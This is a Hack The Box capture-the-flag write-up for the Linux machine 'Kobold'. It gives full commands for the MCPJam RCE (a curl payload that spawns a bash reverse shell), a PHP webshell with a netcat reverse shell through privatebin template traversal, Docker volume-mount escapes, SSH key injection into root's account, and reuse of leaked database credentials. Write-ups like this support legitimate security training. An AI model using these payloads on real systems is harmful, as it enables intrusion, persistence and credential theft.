---
title: "Hack The Box - Kobold"
date: 2026-09-13 06:28:00 -0400
categories: [HTB, Easy]
tags: [htb, kobold, linux, mcpjam, cve-2026-23744, privatebin, cve-2025-64714, docker-escape, privilege-escalation]
---

# Hack The Box - Kobold

**Machine:** Kobold  
**Difficulty:** Easy  
**OS:** Linux  
**Target IP:** 10.129.245.50

## Table of Contents

1. [Introduction](#introduction)
2. [Attack Chain Overview](#attack-chain-overview)
3. [Enumeration](#enumeration)
4. [Initial Access](#initial-access)
5. [Privilege Escalation](#privilege-escalation)
6. [Lessons Learned](#lessons-learned)

## Introduction

Kobold is a Easy difficulty Linux machine featuring multiple web applications and two distinct privilege escalation paths. The attack chain involves discovering MCPJam and privatebin instances through VHOST enumeration, exploiting CVE-2026-23744 for initial shell access, and leveraging file write access and containerization to escalate privileges.

The machine demonstrates two different approaches to privilege escalation: an unintended Docker escape method and an intended path through the Arcane Portal administrative interface. Both paths highlight the importance of discovering exposed management interfaces and writable file locations.

## Attack Chain Overview
```bash
10.129.245.50
│
▼
Nmap
│
▼
VHOST Enumeration
│
┌──┴──┐
│ │
▼ ▼
mcp bin
│ │
│ MCPJam
│ v1.4.2
│
▼
CVE-2026-23744
│
▼
RCE as ben
│
▼
User Flag
│
┌──────────────────────────┐
│ │
▼ ▼
Method 1: Method 2:
Docker Escape Arcane Portal
│ │
▼ ▼
SSH Key Injection privatebin Config
│ │
▼ ▼
SSH as root CVE-2025-64714
│ │
▼ ▼
Root Flag Shell as nobody
│ │
│ Read conf.php
│ │
│ Database Creds
│ │
│ Login Portal
│ │
│ Docker Container
│ │
│ Mount /host
│ │
│ Root Flag
│ │
└──────────────┬───────────┘
│
SSH as root
│
▼
SYSTEM OWNED
```

---

## Enumeration

### Nmap Scanning

Comprehensive port scan:

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.245.50
```

**Key Ports Discovered:**

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | nginx 1.24.0 → HTTPS redirect |
| 443 | HTTPS | nginx 1.24.0 |
| 3552 | HTTP | Golang net/http server |

**SSL Certificate:** `kobold.htb` with wildcard `*.kobold.htb`

### VHOST Enumeration

Discovered subdomains using ffuf:

```bash
ffuf -k -u https://kobold.htb/ \
  -H "Host: FUZZ.kobold.htb" \
  -w subdomains-top1million-20000.txt \
  -fs 154
```

**Discovered Subdomains:**
- `mcp.kobold.htb` - MCPJam v1.4.2
- `bin.kobold.htb` - privatebin 2.0.2

Added to `/etc/hosts`:

```bash
echo "10.129.245.50 kobold.htb" | sudo tee -a /etc/hosts
echo "10.129.245.50 mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### MCPJam Discovery

Accessed `https://mcp.kobold.htb/`

![MCPJam v1.4.2](/assets/img/01-mcpjam-version.jpg)

**Application:** MCPJam Version v1.4.2

---

## Initial Access

### Method 1: CVE-2026-23744 Public Exploit

Searched for public exploits and found:

https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC


Downloaded and modified exploit:

```python
target = "https://mcp.kobold.htb"
ip = "ATTACKER_IP"
port = "PORT"
```

Started listener:

```bash
nc -lvnp PORT
```

Executed exploit:

```bash
python3 exploit.py
```

### Method 2: Direct cURL Exploitation

Referenced security advisory GHSA-232v-j27c-5pp6 for direct API exploitation.

Started listener:

```bash
nc -lvnp PORT
```

Triggered reverse shell via MCPJam API:

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig":{
      "command":"bash",
      "args":["-c","bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1"],
      "env":{}
    },
    "serverId":"ch3"
  }'
```

### Shell as ben

![Reverse Shell as ben](/assets/img/02-shell-as-ben.jpg)

Upgraded shell for better interactivity:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User Flag

```bash
cat /home/ben/user.txt
```

**User Flag:**

85d27a643c5646bd56e1e8bbc3fcff1c


### Group Discovery

Checked group memberships:

```bash
cat /etc/group
```

**Key Groups:**

operator:x:37:ben,alice
docker:x:111:alice


**Findings:** 
- `ben` is in `operator` group
- `alice` is in `docker` group
- `operator` group has access to sensitive directories

---

## Privilege Escalation

### Method 1: Unintended Path - Docker Escape via Volume Mount

#### Reading Root Flag via Docker

![Docker Escape - Root Access](/assets/img/03-docker-escape-root.jpg)

Used Docker to read root flag directly via volume mount:

````bash
docker run --rm -v /:/mnt \
--entrypoint /bin/sh \
--user 0 \
privatebin/nginx-fpm-alpine:2.0.2 \
-c "cat /mnt/root/root.txt"
````

**Output:**

5c7a6b6f4909f006b1d08d2b25d82c33


#### SSH as root

Now attempting SSH with injected key:
#### SSH Key Injection

Generated SSH keypair:

```bash
ssh-keygen -t rsa -b 4096
```

Used Docker with volume mount to inject public key into root's authorized_keys:

```bash
docker run --rm -v /:/mnt \
--entrypoint /bin/sh \
--user 0 \
privatebin/nginx-fpm-alpine:2.0.2 \
-c "echo 'YOUR_PUBLIC_KEY_HERE' >> /mnt/root/.ssh/authorized_keys"
```

#### Verifying SSH Configuration

Checked sshd_config for key-based authentication:

```bash
docker run --rm -v /:/mnt \
--entrypoint /bin/sh \
--user 0 \
privatebin/nginx-fpm-alpine:2.0.2 \
-c "grep -E 'PermitRootLogin|PubkeyAuthentication' /mnt/etc/ssh/sshd_config"
```

**Output:**

PermitRootLogin yes
PubkeyAuthentication yes


#### Setting Correct Permissions

```bash
docker run --rm -v /:/mnt \
--entrypoint /bin/sh \
--user 0 \
privatebin/nginx-fpm-alpine:2.0.2 \
-c "chmod 700 /mnt/root/.ssh && chmod 600 /mnt/root/.ssh/authorized_keys && chown -R root:root /mnt/root/.ssh"
```

#### Verifying Permissions

```bash
docker run --rm -v /:/mnt \
--entrypoint /bin/sh \
--user 0 \
privatebin/nginx-fpm-alpine:2.0.2 \
-c "ls -ld /mnt/root/.ssh && ls -l /mnt/root/.ssh"
```

**Output:**

drwx------ 2 root root 4096 Mar 15 21:23 /mnt/root/.ssh
-rw------- 1 root root 93 Sep 13 11:11 authorized_keys


#### SSH as root

```bash
ssh -i id_rsa root@kobold.htb -v
```

**Verification:**

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# 5c7a6b6f4909f006b1d08d2b25d82c33
```

![Docker Escape - Root Access](/assets/img/03-docker-escape-root.jpg)

---

### Method 2: Intended Path - Arcane Portal via privatebin

#### Discovering privatebin-data

Searched for directories with operator group permissions:

```bash
find / -group operator -ls 2>/dev/null
```

**Discovered:**

/privatebin-data/certs/key.pem (rwxrwx---)
/privatebin-data/certs/cert.pem (rwxrwx---)
/privatebin-data/data/ (rwxrwxrwx) ← WRITABLE


#### CVE-2025-64714 - privatebin 2.0.2 RCE

Found public PoC:

https://github.com/Medaz-Sploit/CVE-2025-64714-privatebin-2.0.2-PoC


Created PHP webshell in writable directory:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /privatebin-data/data/ch3.php
```

#### Gaining Shell as nobody

Started listener:

```bash
nc -lvnp 5577
```

Executed command via PHP shell:

```bash
curl -sk \
  --cookie 'template=../data/ch3' \
  -G \
  --data-urlencode 'cmd=/usr/bin/nc 10.10.14.60 5577 -e /bin/sh' \
  https://bin.kobold.htb
```

**Reverse Shell Connection:**

Connection received on 10.129.245.50 41391
id

uid=65534(nobody) gid=82(www-data) groups=82(www-data)

#### Reading Database Configuration

Checked mounted filesystem:

```bash
mount | grep -E 'ext4|ro'
```

**Output:**

/dev/mapper/ubuntu--vg-ubuntu--lv on /srv/cfg type ext4 (ro,relatime,errors=remount-ro)


Accessed read-only config directory:

```bash
cat /srv/cfg/conf.php
```

**Extracted Credentials:**

[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"


#### Accessing Arcane Portal

Discovered Arcane Portal running on port 3552:

![Arcane Portal Login](/assets/img/04-arcane-portal.jpg)

Logged in with extracted credentials:

User: arcane
Password: ComplexP@sswordAdmin1928


#### Creating Privileged Container

Navigated to Resources → Containers and created a new container with:

![Container Configuration](/assets/img/05-container-config.jpg)

Configured volume mount in Volumes section:

![Volume Mount Configuration](/assets/img/06-volume-mount.jpg)

Created container with host filesystem mounted as `/host`:

![Running Container](/assets/img/07-mysql-container.jpg)

#### Accessing Root Flag

Accessed container shell and navigated to mounted host filesystem:

```bash
# Inside container
cat /host/root/root.txt
# 5c7a6b6f4909f006b1d08d2b25d82c33
```
![Root Access via Arcane Portal](/assets/img/08-root-final.jpg)

#### SSH Key Injection (Alternative)

Added SSH public key to root's authorized_keys:

```bash
echo "YOUR_PUBLIC_KEY_HERE" >> /host/root/.ssh/authorized_keys
```

SSH as root:

```bash
ssh -i (PATH_TO_KEY) root@kobold.htb
```

---

## Lessons Learned

### 1. Multiple Exploitation Paths Exist

This machine demonstrates that there are often multiple ways to achieve the same goal. Both the Docker escape and Arcane Portal approaches lead to root, but through different vectors.

### 2. VHOST Enumeration is Critical

Without VHOST discovery, the privatebin instance would have been missed. Always enumerate DNS subdomains, especially with wildcard certificates.

### 3. File Permissions and Group Membership Matter

The `operator` group membership granted access to writable directories that contained sensitive data. Group permissions should be audited carefully.

### 4. Containerization Can Be a Vulnerability

Docker with volume mounts (especially to root `/`) creates a direct escalation path. The ability to run containers with `-v /:/mnt` essentially grants root access.

### 5. Read-Only Filesystems Don't Prevent Escalation

The `/srv/cfg` was read-only, but read access was sufficient to extract credentials that led to administrative access.

### 6. Management Portals Need Protection

The Arcane Portal was protected only by weak credentials (reused database password). Administrative interfaces should have:
- Strong, unique credentials
- Network-level access controls (not exposed to unprivileged users)
- Audit logging
- Rate limiting

### 7. Database Credentials in Config Files

Storing database credentials in plaintext config files accessible via web server is a critical vulnerability. Use:
- Environment variables
- Secrets management systems
- Principle of least privilege for service accounts

### 8. PHP Webshell Execution

The combination of CVE-2025-64714 and writable storage directory allowed arbitrary PHP execution as the web server user (nobody). Input validation and file upload restrictions are essential.

---

## Comparison: Intended vs Unintended

| Aspect | Unintended (Docker) | Intended (Portal) |
|--------|-------------------|------------------|
| **Discovery** | Docker awareness | Web application enumeration |
| **Access** | Direct volume mount | Administrative credentials |
| **Complexity** | Simple container commands | Multi-step portal navigation |
| **Detection Difficulty** | Easier to detect | Blends with normal admin activity |
| **Reliability** | Highly reliable | Depends on portal functionality |

Both paths demonstrate the importance of defense-in-depth: even with containerization, weak credentials and overpermissive volume mounts create security gaps.

---

## Summary

Kobold demonstrated multiple privilege escalation techniques and the importance of thorough enumeration. The presence of two distinct escalation paths showed different attack surfaces: direct container abuse and management interface exploitation.

**Exploitation Chain:** MCPJam CVE → RCE as ben → Group Membership Discovery → [Docker Escape OR Arcane Portal] → Root Access ✓

---

**Author:** cyberhitman3  
**Date:** September 13, 2026  
**Machine Status:** 🔥 Rooted
